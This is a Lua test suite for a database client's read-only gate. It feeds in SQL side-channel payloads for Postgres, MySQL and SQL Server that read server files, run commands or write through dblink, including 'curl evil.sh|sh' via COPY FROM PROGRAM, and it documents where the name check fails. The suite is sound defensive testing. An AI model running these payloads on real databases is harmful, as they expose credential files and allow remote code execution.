--- The residual the final sign-off landed: `SELECT dblink_exec('...','INSERT ...')` runs its
--- INSERT in a SECOND postgres backend, outside dblens's read-only transaction, as ONE statement
--- led by SELECT. Neither the transaction wrap nor the one-statement rule reaches it.
---
--- What this spec pins is a BEST-EFFORT refusal by NAME, and the last case pins its LIMIT: a
--- SECURITY DEFINER wrapper is not caught, and cannot be. That case is not a bug filed for later,
--- it is the reason the docs say a database read-only ROLE is the only hard boundary against a
--- user who has write credentials and means to use them.
local h = require('helpers')
local sql = require('dblens.sql')

local eq = h.eq

--- Statements that reach outside the read-only transaction, and that every earlier layer lets
--- through: each is a single statement led by SELECT, so the framing rule proves it is one and
--- the classifier calls it a read.
local SIDE_CHANNELS = {
  {
    name = 'dblink_exec runs a write in a second backend',
    sql = "SELECT dblink_exec('dbname=app', 'INSERT INTO victim VALUES (1)')",
  },
  {
    name = 'dblink() with a RETURNING write',
    sql = "SELECT * FROM dblink('dbname=app', 'INSERT INTO victim VALUES (1) RETURNING a')"
      .. ' AS t(a int)',
  },
  { name = 'dblink_connect opens the second backend', sql = "SELECT dblink_connect('dbname=app')" },
  { name = 'postgres_fdw executor', sql = 'SELECT * FROM postgres_fdw_get_connections()' },
  { name = 'lo_export writes a file on the server', sql = "SELECT lo_export(16384, '/tmp/pwned')" },
  { name = 'lo_import reads one', sql = "SELECT lo_import('/etc/passwd')" },
  { name = 'pg_read_file', sql = "SELECT pg_read_file('/etc/passwd')" },
  { name = 'pg_ls_dir', sql = "SELECT pg_ls_dir('/')" },
  { name = 'mysql LOAD_FILE', sql = "SELECT LOAD_FILE('/etc/passwd')" },
  { name = 'mysql sys_exec UDF', sql = "SELECT sys_exec('touch /tmp/pwned')" },
  { name = 'mysql sys_eval UDF', sql = "SELECT sys_eval('id')" },
  --- SQL Server's are worth more here than anywhere else: it has no read-only transaction for
  --- them to escape, so the name check is the only layer between a locked connection and them.
  {
    name = 'mssql OPENROWSET reads a file',
    sql = "SELECT * FROM OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB) x",
  },
  {
    name = 'mssql OPENDATASOURCE opens another server',
    sql = "SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Server=evil').db.dbo.t",
  },
  {
    name = 'mssql OPENQUERY runs on a linked server',
    sql = "SELECT * FROM OPENQUERY(link, 'SELECT 1')",
  },
  { name = 'mssql xp_dirtree lists the filesystem', sql = "SELECT * FROM xp_dirtree('/tmp')" },
  { name = 'mssql xp_fileexist', sql = "SELECT xp_fileexist('/tmp/x')" },
}

describe('side channels: what a locked connection cannot vouch for', function()
  --- The premise of the whole spec: every layer BEFORE this one passes these, so if the refusal
  --- is removed they reach the server.
  it('is the only layer that sees them: each is one provable statement, read-classified', function()
    for _, case in ipairs(SIDE_CHANNELS) do
      eq(sql.single_statement_problem(case.sql), nil, {
        fail_reason = ('%s: the framing rule proves this is one statement'):format(case.name),
      })
      eq(sql.classify(case.sql, sql.dialects.permissive).write, false, {
        fail_reason = ('%s: the classifier reads this as a read'):format(case.name),
      })
    end
  end)

  it('names every one of them', function()
    for _, case in ipairs(SIDE_CHANNELS) do
      eq(type(sql.side_channel_problem(case.sql, sql.dialects.permissive)), 'string', {
        fail_reason = ('%s must be named as a side channel'):format(case.name),
      })
    end
  end)

  it('catches the whole dblink family by prefix, not one name at a time', function()
    for _, name in ipairs({
      'dblink',
      'dblink_exec',
      'dblink_open',
      'dblink_fetch',
      'dblink_send_query',
      'dblink_build_sql_insert',
    }) do
      local problem = sql.side_channel_problem(('SELECT %s(1)'):format(name))
      eq(type(problem), 'string', { fail_reason = name .. ' must be named' })
      eq(problem:find(name, 1, true) ~= nil, true, {
        fail_reason = ('the refusal must name `%s`, got: %s'):format(name, problem),
      })
    end
  end)

  it('leaves ordinary reads alone', function()
    for _, text in ipairs({
      'SELECT * FROM users WHERE a = 1',
      "SELECT REPLACE(name, 'a', 'b') FROM t",
      'SELECT count(*) FROM public.orders',
      -- The name as a quoted IDENTIFIER is a name, not a call.
      'SELECT "dblink_log" FROM audit',
      'SELECT * FROM "load_file"',
      'SELECT "openrowset" FROM audit',
    }) do
      -- mariadb is absent because it shares mysql's dialect; the case below drives every
      -- registered ADAPTER, which is what proves no engine skips this layer.
      for _, dialect in ipairs({
        sql.dialects.postgres,
        sql.dialects.mysql,
        sql.dialects.sqlite,
        sql.dialects.duckdb,
        sql.dialects.mssql,
      }) do
        eq(sql.side_channel_problem(text, dialect), nil, {
          fail_reason = ('`%s` is an ordinary read'):format(text),
        })
      end
    end
  end)

  --- A string literal is DATA everywhere except T-SQL, where `EXEC('...')` runs it. So the name
  --- inside a string counts on mssql and only there, and the cost is named rather than hidden: a
  --- locked mssql read comparing a column to such a literal is refused.
  it('scans inside string literals on mssql, and nowhere else', function()
    local text = "SELECT 'dblink_exec is refused' AS why"
    eq(type(sql.side_channel_problem(text, sql.dialects.mssql)), 'string', {
      fail_reason = 'a T-SQL string literal can be executed, so its words count',
    })
    for _, dialect in ipairs({
      sql.dialects.postgres,
      sql.dialects.mysql,
      sql.dialects.sqlite,
      sql.dialects.duckdb,
      sql.dialects.permissive,
    }) do
      eq(sql.side_channel_problem(text, dialect), nil, {
        fail_reason = 'a string literal is data on every engine but T-SQL',
      })
    end
  end)

  --- The list is shared across dialects on purpose: it is a name check, and a name that reaches
  --- outside the connection on one engine is not safe to allow on another just because that
  --- engine does not define it. What matters is that every ENGINE routes through it.
  it('applies to every registered adapter, with the dialect that adapter uses', function()
    local adapters = require('dblens.adapters')
    for _, kind in ipairs(adapters.kinds()) do
      local adapter = assert(adapters.get(kind))
      eq(
        type(sql.side_channel_problem("SELECT LOAD_FILE('/etc/passwd')", adapter.dialect)),
        'string',
        {
          fail_reason = ('%s does not refuse a known side channel'):format(kind),
        }
      )
      eq(sql.side_channel_problem('SELECT a FROM t WHERE b = 1', adapter.dialect), nil, {
        fail_reason = ('%s refuses an ordinary read'):format(kind),
      })
    end
  end)

  --- MariaDB shares MySQL's dialect and so its list: `LOAD_FILE` reads a file on the server, and
  --- `INTO OUTFILE`/`INTO DUMPFILE` write one. The first is named here, the last two are refused a
  --- layer earlier as a banned read tail.
  it('covers the mariadb file functions on a locked mariadb connection', function()
    local session = h.fake_session(
      require('dblens.session'),
      { kind = 'mariadb', database = 'app', read_only = true }
    )
    for _, payload in ipairs({
      "SELECT LOAD_FILE('/etc/passwd')",
      "SELECT * FROM users INTO OUTFILE '/tmp/pwned'",
      "SELECT a FROM users INTO DUMPFILE '/tmp/pwned'",
    }) do
      eq(type(session:gate(payload)), 'string', { fail_reason = payload .. ' was not refused' })
    end
  end)

  --- On mssql this list matters more than anywhere else: there is no read-only transaction for
  --- these to escape, so nothing behind the name check would have stopped them.
  it('refuses every mssql side channel on a locked mssql connection', function()
    local session = h.fake_session(
      require('dblens.session'),
      { kind = 'mssql', database = 'app', read_only = true }
    )
    for _, payload in ipairs({
      "SELECT * FROM OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB) x",
      "SELECT * FROM OPENDATASOURCE('SQLNCLI', 'Server=evil').db.dbo.t",
      "SELECT * FROM OPENQUERY(link, 'SELECT 1')",
      "SELECT * FROM xp_dirtree('/tmp')",
      "SELECT xp_fileexist('/tmp/x')",
      "EXEC xp_cmdshell 'id'",
      "BULK INSERT t FROM '/etc/passwd'",
    }) do
      eq(type(session:gate(payload)), 'string', { fail_reason = payload .. ' was not refused' })
    end
  end)
end)

describe('side channels: the gate refuses them while LOCKED', function()
  local function locked_session(session_mod)
    return h.fake_session(session_mod, { kind = 'postgres', database = 'app', read_only = true })
  end

  it('refuses every one before a client is spawned', function()
    h.with_fake_exec(function()
      return {}
    end, function(session_mod, calls)
      local session = locked_session(session_mod)
      for _, case in ipairs(SIDE_CHANNELS) do
        local box = h.capture()
        session:run(case.sql, {}, box.sink)
        eq(box[1], nil, { fail_reason = case.name .. ': must produce no result' })
        eq(type(box[2]), 'string', { fail_reason = case.name .. ': must be refused' })
      end
      eq(#calls, 0, { fail_reason = 'a refused side channel must not reach a client' })
    end)
  end)

  --- The refusal has to be actionable: it says which name it objected to and how to run it.
  it('names the function and the way out', function()
    local session = locked_session(require('dblens.session'))
    local refusal = session:gate("SELECT dblink_exec('dbname=app', 'INSERT INTO t VALUES (1)')")
    eq(type(refusal), 'string')
    eq(refusal:find('dblink_exec', 1, true) ~= nil, true, { fail_reason = refusal })
    eq(refusal:find('DbLensWrite', 1, true) ~= nil, true, { fail_reason = refusal })
  end)

  --- Refusing them in EDIT mode too would be theatre: an unlocked connection can already write
  --- with a plain INSERT, so the refusal would only break a legitimate dblink query.
  it('runs them in EDIT mode, where writing is the point', function()
    local session = h.fake_session(
      require('dblens.session'),
      { kind = 'postgres', database = 'app', read_only = false }
    )
    for _, case in ipairs(SIDE_CHANNELS) do
      eq(session:gate(case.sql), nil, {
        fail_reason = ('%s must run on an unlocked connection'):format(case.name),
      })
    end
  end)
end)

--- Mechanisms the brief asked to VERIFY rather than add: each is already refused, and by which
--- layer matters, because that is what a later change must not quietly remove.
describe('side channels: the ones earlier layers already refuse', function()
  local COVERED = {
    {
      name = 'COPY ... TO PROGRAM',
      sql = "COPY (SELECT 1) TO PROGRAM 'touch /tmp/pwned'",
      by = 'COPY is a write verb',
    },
    {
      name = 'COPY ... FROM PROGRAM',
      sql = "COPY t FROM PROGRAM 'curl evil.sh|sh'",
      by = 'COPY is a write verb',
    },
    {
      name = 'SELECT ... INTO OUTFILE',
      sql = "SELECT * FROM users INTO OUTFILE '/tmp/pwned'",
      by = 'OUTFILE is banned in a read tail',
    },
    {
      name = 'SELECT ... INTO DUMPFILE',
      sql = "SELECT a FROM users INTO DUMPFILE '/tmp/pwned'",
      by = 'DUMPFILE is banned in a read tail',
    },
    { name = 'LOAD DATA INFILE', sql = "LOAD DATA INFILE '/etc/passwd' INTO TABLE t", by = 'LOAD' },
    {
      name = 'mssql xp_cmdshell',
      sql = "EXEC xp_cmdshell 'id'",
      by = 'EXEC is a write verb',
    },
    {
      name = 'mssql sp_execute_external_script',
      sql = "EXECUTE sp_execute_external_script @language = N'Python', @script = N'x'",
      by = 'EXECUTE is a write verb',
    },
    {
      name = 'mssql BULK INSERT',
      sql = "BULK INSERT t FROM '/etc/passwd'",
      by = 'not a read verb',
    },
  }

  it('classifies each as a write, so a locked connection refuses it', function()
    for _, case in ipairs(COVERED) do
      eq(sql.classify(case.sql, sql.dialects.permissive).write, true, {
        fail_reason = ('%s must stay a write (%s)'):format(case.name, case.by),
      })
      local session = h.fake_session(
        require('dblens.session'),
        { kind = 'postgres', database = 'app', read_only = true }
      )
      eq(type(session:gate(case.sql)), 'string', {
        fail_reason = ('%s must be refused while locked'):format(case.name),
      })
    end
  end)

  --- MySQL runs the body of `/*!...*/`, so a side channel could hide there. It never reaches the
  --- name scan, because a statement with no leading keyword classifies as a write and a locked
  --- connection refuses every write.
  it('refuses a side channel hidden in a MySQL executable comment as a write', function()
    local text = "/*!40000 SELECT dblink_exec('dbname=app','INSERT INTO t VALUES (1)') */"
    eq(sql.classify(text, sql.dialects.mysql).write, true)
    local session = h.fake_session(
      require('dblens.session'),
      { kind = 'mysql', database = 'app', read_only = true }
    )
    eq(type(session:gate(text)), 'string', { fail_reason = 'an exec comment must not run locked' })
  end)
end)

--- THE DOCUMENTED LIMIT. Not a gap awaiting a fix: no client-side check can close it, because
--- the wrapper is an ordinary function call and only the SERVER knows what it does.
describe('side channels: the by-name check is best-effort, and this is where it ends', function()
  local WRAPPERS = {
    {
      name = 'a SECURITY DEFINER wrapper around dblink_exec',
      sql = 'SELECT refresh_cache()',
    },
    {
      name = 'the same function under another schema',
      sql = "SELECT ops.sync('INSERT INTO victim VALUES (1)')",
    },
    {
      name = 'a plain rename, created by anyone who can create a function',
      sql = "SELECT run_remote('dbname=app', 'INSERT INTO victim VALUES (1)')",
    },
  }

  it('does not catch a wrapper, and a LOCKED connection lets it through', function()
    local session = h.fake_session(
      require('dblens.session'),
      { kind = 'postgres', database = 'app', read_only = true }
    )
    for _, case in ipairs(WRAPPERS) do
      eq(sql.side_channel_problem(case.sql, sql.dialects.postgres), nil, {
        fail_reason = ('%s: a name check cannot see through a wrapper'):format(case.name),
      })
      eq(session:gate(case.sql), nil, {
        fail_reason = ('%s: nothing client-side can refuse this'):format(case.name),
      })
    end
  end)
end)

--- The live proof, on a real server: the payload lands on a WRITABLE connection (so the locked
--- assertion means something) and is refused on a LOCKED one, with the row count read back
--- out-of-band. Needs `DBLENS_TEST_POSTGRES_PORT` and a role that may `CREATE EXTENSION dblink`.
describe('postgres, live: the dblink write is refused on a locked connection', function()
  local target = nil
  local adapter = assert(require('dblens.adapters').get('postgres'))

  --- Send `statement` over the argv the adapter builds, without a gate in front of it.
  local function send(read_only, statement)
    local spec = vim.tbl_extend('force', target.spec, { read_only = read_only })
    local command = adapter.command(spec, target.secret, 'records', target.clients)
    local stdin = read_only and adapter.read_only_script(statement) or statement
    return vim.system(command.argv, { env = command.env, stdin = stdin }):wait(60000)
  end

  local function victim_rows()
    local out = send(false, 'SELECT count(*) AS n FROM victim')
    if out.code ~= 0 then
      return 'gone'
    end
    local first = adapter.decode(out.stdout, {}).rows[1]
    return first and tostring(first[1]) or 'none'
  end

  --- dblink runs in the SERVER's backend, so the connstr must resolve there: a bare
  --- `dbname=/user=` uses the server's own socket. A host-published port does not reach it, which
  --- is the only reason the sign-off's first battery run saw no write.
  local function payload(note)
    return ("SELECT dblink_exec('dbname=%s user=%s', 'INSERT INTO victim(note) VALUES (''%s'')')"):format(
      target.spec.database,
      target.spec.user or 'postgres',
      note
    )
  end

  --- Seed, and confirm dblink is actually installed: without it the refusal proves nothing.
  ---@return boolean ready
  local function seed()
    local out = send(
      false,
      'CREATE EXTENSION IF NOT EXISTS dblink;\n'
        .. 'DROP TABLE IF EXISTS victim;\n'
        .. 'CREATE TABLE victim(note text);\n'
        .. "INSERT INTO victim VALUES ('seed');"
    )
    return out.code == 0
  end

  local function skip()
    if not target then
      MiniTest.add_note(
        'no postgres server (set DBLENS_TEST_POSTGRES_PORT); the live dblink proof did not run'
      )
      return true
    end
    if not seed() then
      MiniTest.add_note('postgres has no `dblink` extension available; the live proof did not run')
      return true
    end
    return false
  end

  before_each(function()
    target = h.live_target('postgres')
  end)

  it(
    'lands the write when the connection is WRITABLE, so the locked case proves something',
    function()
      if skip() then
        return
      end
      local before = victim_rows()
      local out = send(false, payload('DBLINK-WRITABLE'))
      eq(out.code, 0, { fail_reason = 'the dblink payload did not run: ' .. tostring(out.stderr) })
      h.neq(victim_rows(), before, {
        fail_reason = 'dblink wrote nothing even when allowed, so this server cannot prove the fix',
      })
    end
  )

  it('is refused by the gate on a LOCKED connection, and the table does not change', function()
    if skip() then
      return
    end
    local session, err = require('dblens.session').new(
      vim.tbl_extend('force', vim.deepcopy(target.spec), { read_only = true }),
      require('dblens.config').setup({})
    )
    assert(session, tostring(err))
    session.secret = target.secret
    eq(session:mode(), 'LOCKED')

    local before = victim_rows()
    local box = h.capture()
    session:run(payload('DBLINK-VIA-SESSION'), {}, box.sink)
    eq(box[1], nil, { fail_reason = 'a refused run must produce no result' })
    eq(type(box[2]), 'string', { fail_reason = 'the locked gate let the dblink write through' })
    eq(victim_rows(), before, { fail_reason = 'a row landed on a LOCKED connection' })
  end)
end)
